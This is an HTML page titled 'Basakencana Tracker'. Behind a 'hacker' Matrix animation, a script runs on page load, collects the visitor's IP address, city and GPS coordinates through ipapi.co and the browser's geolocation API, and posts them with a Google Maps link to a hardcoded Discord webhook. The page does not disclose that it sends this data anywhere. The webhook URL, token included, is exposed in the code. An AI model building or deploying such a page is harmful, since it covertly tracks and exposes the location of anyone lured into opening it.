<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basakencana Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { margin: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
        
        /* Matriks dipastikan di paling belakang tapi tetap terlihat */
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        /* Kotak info di atas matriks */
        #info {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            background: rgba(0, 0, 0, 0.85);
            color: #0F0;
            padding: 20px;
            border: 2px solid #0F0;
            border-radius: 10px;
            width: 300px;
            text-align: center;
            box-shadow: 0 0 20px #0F0;
        }

        #map { height: 180px; width: 100%; margin-top: 10px; border: 1px solid #0F0; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div id="info">
    <h2 style="margin:0 0 10px 0;">SYSTEM ACTIVE</h2>
    <p id="status">SCANNING...</p>
    <p id="ip" style="font-size: 14px;"></p>
    <p id="location" style="font-size: 14px;"></p>
    <div id="map"></div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

// --- LOGIKA MATRIKS ---
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = "0101010101";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array.from({ length: columns }, () => 1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0F0";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);

// --- LOGIKA PELACAK ---
async function track() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        
        document.getElementById('status').innerText = "TARGET IDENTIFIED";
        document.getElementById('ip').innerText = "IP: " + data.ip;
        document.getElementById('location').innerText = "LOC: " + data.city;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                var map = L.map('map').setView([lat, lon], 13);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([lat, lon]).addTo(map);

                await send(data, mLink, "🎯 GPS");
            }, async () => {
                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                await send(data, mLink, "☁️ IP");
            });
        }
    } catch (e) { console.error(e); }
}

async function send(data, mapsLink, metode) {
    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: "BASAKENCANA",
            content: `🚨 **DETEKSI BARU**\nIP: ${data.ip}\nKota: ${data.city}\nMetode: ${metode}\nMaps: ${mapsLink}`
        })
    });
}

track();
</script>
</body>
</html>
